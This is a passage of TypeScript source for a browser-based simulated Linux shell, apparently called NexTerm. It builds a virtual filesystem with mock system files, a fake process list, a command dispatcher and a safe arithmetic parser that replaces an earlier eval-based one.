export interface VfsNode {
  name: string
  type: 'file' | 'dir'
  content?: string
  children: Map<string, VfsNode>
  mode: number
  owner: string
  group: string
  size: number
  mtime: Date
}

export interface LinuxProcess {
  pid: number
  name: string
  user: string
  cpu: number
  mem: number
  state: string
  time: string
}

export interface ShellState {
  cwd: string
  env: Record<string, string>
  history: string[]
  uid: number
  gid: number
  username: string
  hostname: string
  vfs: VfsNode
  processes: LinuxProcess[]
  startTime: Date
  jobs: { id: number; pid: number; cmd: string; status: string }[]
  aliases: Record<string, string>
  lastJobId: number
}

function createDir(name: string, mode = 0o755): VfsNode {
  return {
    name,
    type: 'dir',
    children: new Map(),
    mode,
    owner: 'root',
    group: 'root',
    size: 4096,
    mtime: new Date(),
  }
}

function createFile(name: string, content: string, mode = 0o644, owner = 'root', group = 'root'): VfsNode {
  return {
    name,
    type: 'file',
    content,
    children: new Map(),
    mode,
    owner,
    group,
    size: content.length,
    mtime: new Date(),
  }
}

function buildVfs(): VfsNode {
  const root = createDir('/', 0o755)
  root.owner = 'root'
  root.group = 'root'

  const bin = createDir('bin', 0o755)
  const boot = createDir('boot', 0o755)
  const dev = createDir('dev', 0o755)
  const etc = createDir('etc', 0o755)
  const home = createDir('home', 0o755)
  const lib = createDir('lib', 0o755)
  const media = createDir('media', 0o755)
  const mnt = createDir('mnt', 0o755)
  const opt = createDir('opt', 0o755)
  const proc = createDir('proc', 0o555)
  const run = createDir('run', 0o755)
  const sbin = createDir('sbin', 0o755)
  const tmp = createDir('tmp', 0o1777)
  const usr = createDir('usr', 0o755)
  const varDir = createDir('var', 0o755)

  const user = createDir('user', 0o755)
  user.owner = 'user'
  user.group = 'user'
  const docs = createDir('Documents', 0o755)
  docs.owner = 'user'
  docs.group = 'user'
  const dls = createDir('Downloads', 0o755)
  dls.owner = 'user'
  dls.group = 'user'
  const projects = createDir('projects', 0o755)
  projects.owner = 'user'
  projects.group = 'user'
  const desktop = createDir('Desktop', 0o755)
  desktop.owner = 'user'
  desktop.group = 'user'

  const bashrcContent = `# ~/.bashrc
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
export EDITOR=vim
export LANG=en_US.UTF-8
alias ll='ls -la'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
PS1='\\u@\\h:\\w\\$ '

# Welcome message
echo "Welcome to NexTerm Linux Environment v1.0"
echo "Kernel: Linux 6.1.0-nexterm (x86_64)"
`
  user.children.set('.bashrc', createFile('.bashrc', bashrcContent, 0o644, 'user', 'user'))

  const helloContent = `#!/usr/bin/env python3
def greet(name):
    print(f"Hello, {name}!")

if __name__ == "__main__":
    greet("NexTerm User")
    print("Welcome to the Linux environment!")
`
  projects.children.set('hello.py', createFile('hello.py', helloContent, 0o644, 'user', 'user'))

  const readmeContent = `# NexTerm Linux Environment

This is a simulated Linux environment running inside NexTerm.
It provides a fully interactive shell with 30+ commands.

## Features
- Virtual filesystem with realistic structure
- 30+ Linux commands
- Pipe and redirect support
- Command history
- Environment variables

Enjoy exploring!
`
  projects.children.set('README.md', createFile('README.md', readmeContent, 0o644, 'user', 'user'))

  const notesContent = `# Linux Commands Cheat Sheet

## File Operations
ls      - List directory contents
cd      - Change directory
pwd     - Print working directory
mkdir   - Create directory
touch   - Create empty file
cat     - Display file contents
cp      - Copy files
mv      - Move/rename files
rm      - Remove files
head    - Show first lines
tail    - Show last lines
wc      - Word/line count
grep    - Search text pattern
find    - Search for files
tree    - Display directory tree

## System Info
uname   - System information
whoami  - Current user
hostname- System hostname
date    - Display date/time
uptime  - System uptime
free    - Memory usage
df      - Disk space
ps      - Process status
top     - Task manager

## Network
ping    - Test connectivity
curl    - Transfer URL data
ifconfig- Network config

## Text & Shell
echo    - Print text
clear   - Clear screen
history - Command history
env     - Environment vars
chmod   - Change permissions
which   - Locate command
`
  docs.children.set('cheatsheet.txt', createFile('cheatsheet.txt', notesContent, 0o644, 'user', 'user'))

  user.children.set('Documents', docs)
  user.children.set('Downloads', dls)
  user.children.set('projects', projects)
  user.children.set('Desktop', desktop)

  home.children.set('user', user)
  root.children.set('home', home)

  const hostnameFile = createFile('hostname', 'nexterm-vm\n', 0o644)
  const hostsFile = createFile('hosts', `127.0.0.1   localhost
::1         localhost
192.168.1.100 nexterm-vm
`, 0o644)
  const passwdFile = createFile('passwd', `root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:NexTerm User:/home/user:/bin/bash
`, 0o644)
  const groupFile = createFile('group', `root:x:0:
user:x:1000:
`, 0o644)
  const osRelease = createFile('os-release', `NAME="NexTerm Linux"
VERSION="1.0 (nexterm)"
ID=nexterm
PRETTY_NAME="NexTerm Linux 1.0"
ANSI_COLOR="0;36"
`, 0o644)

  etc.children.set('hostname', hostnameFile)
  etc.children.set('hosts', hostsFile)
  etc.children.set('passwd', passwdFile)
  etc.children.set('group', groupFile)
  etc.children.set('os-release', osRelease)

  // Apt sources (Ubuntu-style)
  const aptDir = createDir('apt', 0o755)
  const sourcesList = createFile('sources.list', `# NexTerm Linux Package Sources
deb https://archive.nexterm.io/linux/ stable main restricted universe multiverse
deb https://archive.nexterm.io/linux/ stable-updates main restricted universe multiverse
deb https://archive.nexterm.io/linux/ stable-security main restricted universe multiverse
`, 0o644)
  const sourcesListD = createDir('sources.list.d', 0o755)
  const partnerList = createFile('partner.list', '# Partner repository\ndeb https://archive.nexterm.io/linux/ stable partner\n', 0o644)
  sourcesListD.children.set('partner.list', partnerList)
  aptDir.children.set('sources.list', sourcesList)
  aptDir.children.set('sources.list.d', sourcesListD)
  etc.children.set('apt', aptDir)

  // Network config
  const networkDir = createDir('network', 0o755)
  const interfaces = createFile('interfaces', `# /etc/network/interfaces
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 192.168.1.100
    netmask 255.255.255.0
    gateway 192.168.1.1
`, 0o644)
  networkDir.children.set('interfaces', interfaces)
  etc.children.set('network', networkDir)

  // Resolv.conf
  const resolvConf = createFile('resolv.conf', `# DNS Configuration
nameserver 8.8.8.8
nameserver 8.8.4.4
nameserver 1.1.1.1
`, 0o644)
  etc.children.set('resolv.conf', resolvConf)

  // Sudoers
  const sudoers = createFile('sudoers', `# /etc/sudoers
root ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo ALL=(ALL:ALL) ALL
user ALL=(ALL:ALL) NOPASSWD: ALL
`, 0o440)
  etc.children.set('sudoers', sudoers)

  // Fstab
  const fstab = createFile('fstab', `# /etc/fstab
UUID=abc-def-123 / ext4 errors=remount-ro 0 1
UUID=ghi-jkl-456 /boot ext4 defaults 0 2
UUID=mno-pqr-789 swap swap defaults 0 0
`, 0o644)
  etc.children.set('fstab', fstab)

  // Shells
  const shells = createFile('shells', `/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
`, 0o644)
  etc.children.set('shells', shells)

  // Systemd
  const systemdDir = createDir('systemd', 0o755)
  const systemSystem = createDir('system', 0o755)
  const sshdService = createFile('sshd.service', `[Unit]
Description=OpenSSH Daemon
After=network.target

[Service]
ExecStart=/usr/sbin/sshd -D
Restart=always

[Install]
WantedBy=multi-user.target
`, 0o644)
  systemSystem.children.set('sshd.service', sshdService)
  const nginxService = createFile('nginx.service', `[Unit]
Description=nginx - high performance web server
After=network.target

[Service]
Type=forking
ExecStart=/usr/sbin/nginx
ExecReload=/usr/sbin/nginx -s reload
ExecStop=/usr/sbin/nginx -s stop

[Install]
WantedBy=multi-user.target
`, 0o644)
  systemSystem.children.set('nginx.service', nginxService)
  systemdDir.children.set('system', systemSystem)
  etc.children.set('systemd', systemdDir)

  // Cron
  const cronDDir = createDir('cron.d', 0o755)
  const cronDaily = createFile('apt-compat', `# Apt daily update
0 6 * * * root /usr/bin/apt update
`, 0o644)
  cronDDir.children.set('apt-compat', cronDaily)
  etc.children.set('cron.d', cronDDir)

  // Security
  const securityDir = createDir('security', 0o755)
  const limitsConf = createFile('limits.conf', `# /etc/security/limits.conf
* soft nofile 65536
* hard nofile 65536
* soft nproc 65536
* hard nproc 65536
`, 0o644)
  securityDir.children.set('limits.conf', limitsConf)
  etc.children.set('security', securityDir)

  root.children.set('etc', etc)

  const nullDev = createFile('null', '', 0o666)
  const zeroDev = createFile('zero', '\0'.repeat(1024), 0o666)
  const randomDev = createFile('random', 'random-data-placeholder', 0o444)
  const urandomDev = createFile('urandom', 'urandom-data-placeholder', 0o444)

  dev.children.set('null', nullDev)
  dev.children.set('zero', zeroDev)
  dev.children.set('random', randomDev)
  dev.children.set('urandom', urandomDev)
  root.children.set('dev', dev)

  const varLog = createDir('log', 0o755)
  const syslogFile = createFile('syslog', `[  0.000000] Linux version 6.1.0-nexterm (nexterm@buildhost) (gcc 12.2.0) #1 SMP PREEMPT_DYNAMIC Mon Jan 1 00:00:00 UTC 2024
[  0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-6.1.0-nexterm root=UUID=abc-def-123 quiet splash
[  0.100000] Kernel command line: BOOT_IMAGE=/boot/vmlinuz-6.1.0-nexterm root=UUID=abc-def-123
[  0.200000] BIOS-provided physical RAM map:
[  0.300000] NX (Execute Disable) protection: active
[  0.400000] Detected CPU: AMD Ryzen 7 5800X 8-Core Processor @ 3.80GHz
[  1.000000] Memory: 16384M available, 8192M reserved
[  1.500000] PCI: MMCONFIG for domain 0000 [bus 00-ff]
[  2.000000] ACPI: SSDT loaded
[  2.500000] NET: Registered PF_INET protocol family
[  3.000000] EXT4-fs (sda1): mounted filesystem
[  3.500000] systemd[1]: System time before build time, advancing clock.
[  4.000000] systemd[1]: Reached target Basic System.
[  4.500000] sshd[1024]: Server listening on 0.0.0.0 port 22.
`, 0o644)
  varLog.children.set('syslog', syslogFile)
  varDir.children.set('log', varLog)

  // Var cache and lib (Ubuntu-style)
  const varCache = createDir('cache', 0o755)
  const varCacheApt = createDir('apt', 0o755)
  const varCacheAptArchives = createDir('archives', 0o755)
  varCacheApt.children.set('archives', varCacheAptArchives)
  varCache.children.set('apt', varCacheApt)
  varDir.children.set('cache', varCache)

  const varLib = createDir('lib', 0o755)
  const varLibDpkg = createDir('dpkg', 0o755)
  const dpkgStatus = createFile('status', `Package: bash
Status: install ok installed
Priority: required
Section: shells
Version: 5.2.21-2ubuntu4
Description: GNU Bourne Again SHell

Package: coreutils
Status: install ok installed
Priority: required
Section: utils
Version: 9.4-3ubuntu6
Description: GNU core utilities

Package: vim
Status: install ok installed
Priority: important
Section: editors
Version: 2:9.1.0016-1ubuntu7
Description: Vi IMproved - enhanced vi editor

Package: nginx
Status: install ok installed
Priority: optional
Section: httpd
Version: 1.24.0-2ubuntu7
Description: high performance web server
`, 0o644)
  varLibDpkg.children.set('status', dpkgStatus)
  varLib.children.set('dpkg', varLibDpkg)
  varDir.children.set('lib', varLib)

  root.children.set('var', varDir)

  const usrBin = createDir('bin', 0o755)
  const usrLib = createDir('lib', 0o755)
  const usrShare = createDir('share', 0o755)
  const usrLocal = createDir('local', 0o755)
  const usrLocalBin = createDir('bin', 0o755)
  usrLocal.children.set('bin', usrLocalBin)
  usr.children.set('bin', usrBin)
  usr.children.set('lib', usrLib)
  usr.children.set('share', usrShare)
  usr.children.set('local', usrLocal)
  root.children.set('usr', usr)

  const procCpuinfo = createFile('cpuinfo', `processor	: 0
vendor_id	: AuthenticAMD
cpu family	: 25
model		: 33
model name	: AMD Ryzen 7 5800X 8-Core Processor
stepping	: 2
microcode	: 0xa201025
cpu MHz		: 3800.000
cache size	: 512 KB
siblings	: 16
cpu cores	: 8
`, 0o444)
  const procMeminfo = createFile('meminfo', `MemTotal:       16384000 kB
MemFree:         8192000 kB
MemAvailable:   10240000 kB
Buffers:          512000 kB
Cached:          2048000 kB
SwapTotal:       4096000 kB
SwapFree:        4096000 kB
`, 0o444)
  const procUptime = createFile('uptime', `${Math.floor(Date.now() / 1000) - 3600}.00 ${Math.floor(Math.random() * 1000)}.00\n`, 0o444)
  const procVersion = createFile('version', 'Linux version 6.1.0-nexterm (nexterm@buildhost) (gcc 12.2.0) #1 SMP PREEMPT_DYNAMIC Mon Jan 1 00:00:00 UTC 2024\n', 0o444)
  const procLoadavg = createFile('loadavg', '0.15 0.10 0.05 1/256 12345\n', 0o444)

  proc.children.set('cpuinfo', procCpuinfo)
  proc.children.set('meminfo', procMeminfo)
  proc.children.set('uptime', procUptime)
  proc.children.set('version', procVersion)
  proc.children.set('loadavg', procLoadavg)
  root.children.set('proc', proc)

  const bootConfig = createFile('config-6.1.0-nexterm', `CONFIG_X86_64=y
CONFIG_SMP=y
CONFIG_PREEMPT=y
CONFIG_EXT4_FS=y
CONFIG_NET=y
`, 0o644)
  boot.children.set('config-6.1.0-nexterm', bootConfig)
  root.children.set('boot', boot)

  root.children.set('bin', bin)
  root.children.set('boot', boot)
  root.children.set('lib', lib)
  root.children.set('media', media)
  root.children.set('mnt', mnt)
  root.children.set('opt', opt)
  root.children.set('run', run)
  root.children.set('sbin', sbin)
  root.children.set('tmp', tmp)

  return root
}

function defaultProcesses(): LinuxProcess[] {
  return [
    { pid: 1, name: 'init', user: 'root', cpu: 0.0, mem: 0.1, state: 'S', time: '00:00:02' },
    { pid: 10, name: 'systemd', user: 'root', cpu: 0.0, mem: 0.3, state: 'S', time: '00:00:05' },
    { pid: 42, name: 'sshd', user: 'root', cpu: 0.0, mem: 0.2, state: 'S', time: '00:00:01' },
    { pid: 88, name: 'cron', user: 'root', cpu: 0.0, mem: 0.1, state: 'S', time: '00:00:00' },
    { pid: 96, name: 'dbus-daemon', user: 'messagebus', cpu: 0.0, mem: 0.2, state: 'S', time: '00:00:01' },
    { pid: 100, name: 'nginx', user: 'www-data', cpu: 0.1, mem: 0.5, state: 'S', time: '00:00:10' },
    { pid: 128, name: 'rsyslogd', user: 'root', cpu: 0.0, mem: 0.2, state: 'S', time: '00:00:03' },
    { pid: 256, name: 'bash', user: 'user', cpu: 0.0, mem: 0.2, state: 'S', time: '00:00:03' },
    { pid: 512, name: 'python3', user: 'user', cpu: 2.5, mem: 1.8, state: 'R', time: '00:00:15' },
    { pid: 768, name: 'node', user: 'user', cpu: 1.2, mem: 2.1, state: 'S', time: '00:00:08' },
    { pid: 1024, name: 'vim', user: 'user', cpu: 0.3, mem: 0.4, state: 'S', time: '00:00:12' },
    { pid: 1280, name: 'docker', user: 'root', cpu: 0.5, mem: 3.2, state: 'S', time: '00:02:30' },
    { pid: 2048, name: 'mysql', user: 'mysql', cpu: 1.0, mem: 4.5, state: 'S', time: '00:01:45' },
  ]
}

function modeStr(mode: number): string {
  const r = (mode & 0o400) ? 'r' : '-'
  const w = (mode & 0o200) ? 'w' : '-'
  const x = (mode & 0o100) ? 'x' : '-'
  const rr = (mode & 0o40) ? 'r' : '-'
  const ww = (mode & 0o20) ? 'w' : '-'
  const xx = (mode & 0o10) ? 'x' : '-'
  const rrr = (mode & 0o4) ? 'r' : '-'
  const www = (mode & 0o2) ? 'w' : '-'
  const xxx = (mode & 0o1) ? 'x' : '-'
  const t = (mode & 0o4000) ? { '-': 'S', r: 'r', w: 'w', x: 's' }[r] ?? 'S' : r
  return `${mode & 0o40000 ? 'd' : '-'}${t}${w === 'w' && (mode & 0o2000) ? 's' : w}${x}${rr}${ww}${xx}${rrr}${www}${xxx}`
}

function resolvePath(cwd: string, target: string): string[] {
  let base = target.startsWith('/') ? [] : cwd.split('/').filter(Boolean)
  const parts = target.split('/').filter(Boolean)
  for (const p of parts) {
    if (p === '..') {
      base.pop()
    } else if (p !== '.') {
      base.push(p)
    }
  }
  return base
}

function resolveNode(root: VfsNode, cwd: string, path: string): { node: VfsNode | null; abspath: string } {
  const parts = resolvePath(cwd, path)
  const abspath = '/' + parts.join('/')
  if (parts.length === 0) return { node: root, abspath: '/' }
  let current: VfsNode = root
  for (const part of parts) {
    if (!current.children.has(part)) return { node: null, abspath }
    current = current.children.get(part)!
  }
  return { node: current, abspath }
}

// ============================================================================
// 安全算术表达式求值（安全审计修复发现 16，MEDIUM）
//
// 替代 `new Function('return (' + expr + ')')()` 的递归下降解析器。
// 仅允许数字与 + - * / % ^ ( ) 运算符，拒绝任何标识符/字符串/JS 语法，
// 从根本上杜绝代码注入。
//
// 文法（左结合除 ^ 外）：
//   expr   := term (('+' | '-') term)*
//   term   := factor (('*' | '/' | '%') factor)*
//   factor := base ('^' factor)?      // ^ 右结合
//   base   := number | '(' expr ')' | ('+' | '-') base
// ============================================================================

class ArithmeticTokenizer {
  private pos = 0
  constructor(private readonly src: string) {}
  nextToken(): { type: 'num' | 'op' | 'paren' | 'eof'; value: string } {
    // 跳过空白（实际 cmdBc 已 strip，但双保险）
    while (this.pos < this.src.length && /\s/.test(this.src[this.pos])) this.pos++
    if (this.pos >= this.src.length) return { type: 'eof', value: '' }
    const ch = this.src[this.pos]
    // 数字（含小数）
    if (/[0-9.]/.test(ch)) {
      let num = ''
      while (this.pos < this.src.length && /[0-9.]/.test(this.src[this.pos])) {
        num += this.src[this.pos]
        this.pos++
      }
      // 拒绝多个小数点
      if ((num.match(/\./g) || []).length > 1) {
        throw new Error(`非法数字: ${num}`)
      }
      return { type: 'num', value: num }
    }
    // 运算符
    if ('+-*/%^'.includes(ch)) {
      this.pos++
      return { type: 'op', value: ch }
    }
    // 括号
    if (ch === '(' || ch === ')') {
      this.pos++
      return { type: 'paren', value: ch }
    }
    // 其他字符一律拒绝（防止注入标识符/字符串/JS 语法）
    throw new Error(`非法字符 '${ch}'`)
  }
}

function safeArithmeticEval(expr: string): number {
  if (!expr) throw new Error('空表达式')
  const tokenizer = new ArithmeticTokenizer(expr)
  let current = tokenizer.nextToken()

  function consume(): void {
    current = tokenizer.nextToken()
  }

  function parseExpr(): number {
    let left = parseTerm()
    while (current.type === 'op' && (current.value === '+' || current.value === '-')) {
      const op = current.value
      consume()
      const right = parseTerm()
      left = op === '+' ? left + right : left - right
    }
    return left
  }

  function parseTerm(): number {
    let left = parseFactor()
    while (current.type === 'op' && (current.value === '*' || current.value === '/' || current.value === '%')) {
      const op = current.value
      consume()
      const right = parseFactor()
      if (op === '*') left = left * right
      else if (op === '/') {
        if (right === 0) throw new Error('除零')
        left = left / right
      } else {
        // % 取模
        if (right === 0) throw new Error('模零')
        left = left % right
      }
    }
    return left
  }

  function parseFactor(): number {
    const base = parseBase()
    if (current.type === 'op' && current.value === '^') {
      consume()
      const exponent = parseFactor() // 右结合
      return Math.pow(base, exponent)
    }
    return base
  }

  function parseBase(): number {
    if (current.type === 'op' && (current.value === '+' || current.value === '-')) {
      const op = current.value
      consume()
      const operand = parseBase()
      return op === '-' ? -operand : operand
    }
    if (current.type === 'num') {
      const n = parseFloat(current.value)
      if (Number.isNaN(n)) throw new Error(`非法数字: ${current.value}`)
      consume()
      return n
    }
    if (current.type === 'paren' && current.value === '(') {
      consume()
      const inner = parseExpr()
      // 修复 TS2367：显式声明类型断开控制流收窄。
      // 原代码 `current.value !== ')'` 在 `if (... current.value === '(')` 块内被 TS 收窄为
      // 字面量 '('，导致判定为 `'"("' and '")"' have no overlap`。
      // 通过显式标注 `string` 类型，覆盖 TS 的字面量收窄推断，
      // 正确反映 parseExpr() 已通过 consume() 改变 current 的事实。
      const afterType: 'num' | 'op' | 'paren' | 'eof' = current.type
      const afterValue: string = current.value
      if (afterType !== 'paren' || afterValue !== ')') {
        throw new Error('缺失右括号 )')
      }
      consume()
      return inner
    }
    throw new Error(`意外 token: ${current.type} '${current.value}'`)
  }

  const result = parseExpr()
  if (current.type !== 'eof') {
    throw new Error(`尾部多余 token: ${current.type} '${current.value}'`)
  }
  return result
}

export class LinuxShell {
  state: ShellState
  private commandNames: string[]

  constructor() {
    this.state = {
      cwd: '/home/user',
      env: {
        HOME: '/home/user',
        USER: 'user',
        PATH: '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin',
        SHELL: '/bin/bash',
        TERM: 'xterm-256color',
        LANG: 'en_US.UTF-8',
        PWD: '/home/user',
        HOSTNAME: 'nexterm-vm',
        EDITOR: 'vim',
      },
      history: [],
      uid: 1000,
      gid: 1000,
      username: 'user',
      hostname: 'nexterm-vm',
      vfs: buildVfs(),
      processes: defaultProcesses(),
      startTime: new Date(),
      jobs: [],
      aliases: {},
      lastJobId: 0,
    }
    this.commandNames = [
      'ls', 'cd', 'pwd', 'mkdir', 'touch', 'cat', 'cp', 'mv', 'rm', 'head', 'tail',
      'wc', 'grep', 'find', 'tree', 'echo', 'clear', 'history', 'uname', 'whoami',
      'hostname', 'date', 'uptime', 'free', 'df', 'ps', 'top', 'ping', 'curl',
      'ifconfig', 'chmod', 'env', 'which', 'help', 'man', 'r#m', 'rmdir', 'du',
      'apt', 'apt-get', 'dpkg', 'sudo', 'su', 'passwd', 'useradd', 'groups',
      'kill', 'killall', 'bg', 'fg', 'jobs', 'nice', 'renice', 'nohup',
      'sed', 'sort', 'uniq', 'cut', 'diff', 'tr', 'awk', 'tee', 'xargs',
      'tar', 'gzip', 'gunzip', 'zip', 'unzip',
      'ip', 'ss', 'netstat', 'nslookup', 'dig', 'traceroute', 'wget', 'nc',
      'lscpu', 'lsblk', 'lspci', 'lsusb',
      'systemctl', 'service', 'journalctl',
      'locate', 'updatedb', 'whereis', 'file', 'stat',
      'nmap', 'tcpdump',
      'alias', 'unalias', 'export', 'source', 'type',
      'cal', 'bc', 'sleep', 'watch', 'printf', 'seq', 'yes', 'base64',
      'neofetch', 'crontab', 'docker', 'mount', 'umount', 'shutdown', 'reboot', 'hostnamectl',
    ]
  }

  getPrompt(): string {
    const wd = this.state.cwd.replace(this.state.env.HOME, '~')
    return `${this.state.username}@${this.state.hostname}:${wd}$ `
  }

  getTabCompletions(partial: string): string[] {
    const parts = partial.split(' ')
    if (parts.length === 1) {
      const prefix = parts[0].toLowerCase()
      return this.commandNames.filter(c => c.startsWith(prefix))
    }
    const lastPart = parts[parts.length - 1]
    const { node } = resolveNode(this.state.vfs, this.state.cwd, lastPart.startsWith('/') ? '/' : '.')
    if (!node || node.type !== 'dir') return []
    const prefix = lastPart.split('/').pop() || ''
    const completions: string[] = []
    for (const name of node.children.keys()) {
      if (name.startsWith(prefix)) completions.push(name)
    }
    return completions
  }

  execute(input: string): string {
    const trimmed = input.trim()
    if (!trimmed) return ''

    this.state.history.push(trimmed)
    if (this.state.history.length > 500) this.state.history.shift()

    const segments = trimmed.split('|')
    if (segments.length > 1) {
      let pipeInput = ''
      for (let i = 0; i < segments.length; i++) {
        const result = this.executeSingle(segments[i].trim(), pipeInput)
        if (typeof result === 'string' && result.startsWith('__ERROR__:')) return result.replace('__ERROR__:', '')
        pipeInput = result
      }
      return pipeInput
    }

    const redirectMatch = trimmed.match(/^(.+?)\s*>>\s*(.+)$/)
    if (redirectMatch) {
      const cmdPart = redirectMatch[1].trim()
      const filePath = this.expandVars(redirectMatch[2].trim())
      const output = this.executeSingle(cmdPart, '')
      if (output.startsWith('__ERROR__:')) return output.replace('__ERROR__:', '')
      return this.appendFile(filePath, output)
    }

    const redirectOutMatch = trimmed.match(/^(.+?)\s*>\s*(.+)$/)
    if (redirectOutMatch) {
      const cmdPart = redirectOutMatch[1].trim()
      const filePath = this.expandVars(redirectOutMatch[2].trim())
      const output = this.executeSingle(cmdPart, '')
      if (output.startsWith('__ERROR__:')) return output.replace('__ERROR__:', '')
      return this.writeFile(filePath, output)
    }

    return this.executeSingle(trimmed, '')
  }

  private expandVars(s: string): string {
    return s.replace(/\$(\w+)|\$\{(\w+)\}/g, (_, k1, k2) => {
      const key = k1 || k2
      return this.state.env[key] ?? ''
    })
  }

  private executeSingle(cmdLine: string, pipeInput: string): string {
    const parts = cmdLine.match(/(?:[^\s"]+|"[^"]*")+/g) || []
    if (parts.length === 0) return ''
    const cmd = parts[0]
    const args = parts.slice(1).map(a => a.replace(/^"|"$/g, ''))

    switch (cmd) {
      case 'ls': return this.cmdLs(args)
      case 'cd': return this.cmdCd(args)
      case 'pwd': return this.cmdPwd()
      case 'mkdir': return this.cmdMkdir(args)
      case 'touch': return this.cmdTouch(args)
      case 'cat': return this.cmdCat(args)
      case 'cp': return this.cmdCp(args)
      case 'mv': return this.cmdMv(args)
      case 'rm': return this.cmdRm(args)
      case 'head': return this.cmdHead(args)
      case 'tail': return this.cmdTail(args)
      case 'wc': return this.cmdWc(args, pipeInput)
      case 'grep': return this.cmdGrep(args, pipeInput)
      case 'find': return this.cmdFind(args)
      case 'tree': return this.cmdTree(args)
      case 'echo': return this.cmdEcho(args)
      case 'clear': return '__CLEAR__'
      case 'history': return this.cmdHistory()
      case 'uname': return this.cmdUname(args)
      case 'whoami': return this.cmdWhoami()
      case 'hostname': return this.cmdHostname(args)
      case 'date': return this.cmdDate(args)
      case 'uptime': return this.cmdUptime()
      case 'free': return this.cmdFree(args)
      case 'df': return this.cmdDf(args)
      case 'ps': return this.cmdPs(args)
      case 'top': return this.cmdTop()
      case 'ping': return this.cmdPing(args)
      case 'curl': return this.cmdCurl(args)
      case 'ifconfig': return this.cmdIfconfig()
      case 'chmod': return this.cmdChmod(args)
      case 'env': return this.cmdEnv()
      case 'which': return this.cmdWhich(args)
      case 'help': return this.cmdHelp()
      case 'man': return args.length > 0 ? this.cmdMan(args[0]) : 'What manual page do you want?'
      case 'rmdir': return this.cmdRmdir(args)
      case 'du': return this.cmdDu(args)
      case 'r#m': return this.cmdRm(args)
      case 'apt': case 'apt-get': return this.cmdApt(args)
      case 'dpkg': return this.cmdDpkg(args)
      case 'sudo': return this.cmdSudo(args)
      case 'su': return this.cmdSu(args)
      case 'passwd': return this.cmdPasswd(args)
      case 'useradd': return this.cmdUseradd(args)
      case 'groups': return this.cmdGroups(args)
      case 'kill': return this.cmdKill(args)
      case 'killall': return this.cmdKillall(args)
      case 'bg': return this.cmdBg(args)
      case 'fg': return this.cmdFg(args)
      case 'jobs': return this.cmdJobs(args)
      case 'nice': return this.cmdNice(args)
      case 'renice': return this.cmdRenice(args)
      case 'nohup': return this.cmdNohup(args)
      case 'sed': return this.cmdSed(args, pipeInput)
      case 'sort': return this.cmdSort(args, pipeInput)
      case 'uniq': return this.cmdUniq(args, pipeInput)
      case 'cut': return this.cmdCut(args, pipeInput)
      case 'diff': return this.cmdDiff(args)
      case 'tr': return this.cmdTr(args, pipeInput)
      case 'awk': return this.cmdAwk(args, pipeInput)
      case 'tee': return this.cmdTee(args, pipeInput)
      case 'xargs': return this.cmdXargs(args, pipeInput)
      case 'tar': return this.cmdTar(args)
      case 'gzip': return this.cmdGzip(args)
      case 'gunzip': return this.cmdGunzip(args)
      case 'zip': return this.cmdZip(args)
      case 'unzip': return this.cmdUnzip(args)
      case 'ip': return this.cmdIp(args)
      case 'ss': return this.cmdSs(args)
      case 'netstat': return this.cmdNetstat(args)
      case 'nslookup': return this.cmdNslookup(args)
      case 'dig': return this.cmdDig(args)
      case 'traceroute': return this.cmdTraceroute(args)
      case 'wget': return this.cmdWget(args)
      case 'nc': return this.cmdNc(args)
      case 'lscpu': return this.cmdLscpu()
      case 'lsblk': return this.cmdLsblk()
      case 'lspci': return this.cmdLspci()
      case 'lsusb': return this.cmdLsusb()
      case 'systemctl': return this.cmdSystemctl(args)
      case 'service': return this.cmdService(args)
      case 'journalctl': return this.cmdJournalctl(args)
      case 'locate': return this.cmdLocate(args)
      case 'updatedb': return this.cmdUpdatedb()
      case 'whereis': return this.cmdWhereis(args)
      case 'file': return this.cmdFile(args)
      case 'stat': return this.cmdStat(args)
      case 'nmap': return this.cmdNmap(args)
      case 'tcpdump': return this.cmdTcpdump(args)
      case 'alias': return this.cmdAlias(args, cmdLine)
      case 'unalias': return this.cmdUnalias(args)
      case 'export': return this.cmdExport(args, cmdLine)
      case 'source': return this.cmdSource(args)
      case 'type': return this.cmdType(args)
      case 'cal': return this.cmdCal(args)
      case 'bc': return this.cmdBc(args, pipeInput)
      case 'sleep': return this.cmdSleep(args)
      case 'watch': return this.cmdWatch(args)
      case 'printf': return this.cmdPrintf(args)
      case 'seq': return this.cmdSeq(args)
      case 'yes': return this.cmdYes(args)
      case 'base64': return this.cmdBase64(args, pipeInput)
      case 'neofetch': return this.cmdNeofetch()
      case 'crontab': return this.cmdCrontab(args)
      case 'docker': return this.cmdDocker(args)
      case 'mount': return this.cmdMount(args)
      case 'umount': return this.cmdUmount(args)
      case 'shutdown': return this.cmdShutdown(args)
      case 'reboot': return this.cmdReboot(args)
      case 'hostnamectl': return this.cmdHostnamectl(args)
      default: return `bash: ${cmd}: command not found`
    }
  }

  private resolveRealPath(path: string): string {
    const parts = resolvePath(this.state.cwd, path)
    return '/' + parts.join('/')
  }

  private getNode(path: string): VfsNode | null {
    return resolveNode(this.state.vfs, this.state.cwd, path).node
  }

  private formatSize(bytes: number): string {
    if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(1) + 'G'
    if (bytes >= 1048576) return (bytes / 1048576).toFixed(1) + 'M'
    if (bytes >= 1024) return (bytes / 1024).toFixed(1) + 'K'
    return bytes + 'B'
  }

  private formatTime(d: Date): string {
    const now = new Date()
    const diff = now.getTime() - d.getTime()
    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
    if (diff > 180 * 24 * 3600 * 1000) {
      return `${months[d.getMonth()]} ${String(d.getDate()).padStart(2, ' ')}  ${d.getFullYear()}`
    }
    return `${months[d.getMonth()]} ${String(d.getDate()).padStart(2, ' ')} ${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`
  }

  private writeFile(path: string, content: string): string {
    const parts = resolvePath(this.state.cwd, path)
    if (parts.length === 0) return '__ERROR__:Cannot write to root directory'
    const name = parts.pop()!
    const dirPath = '/' + parts.join('/')
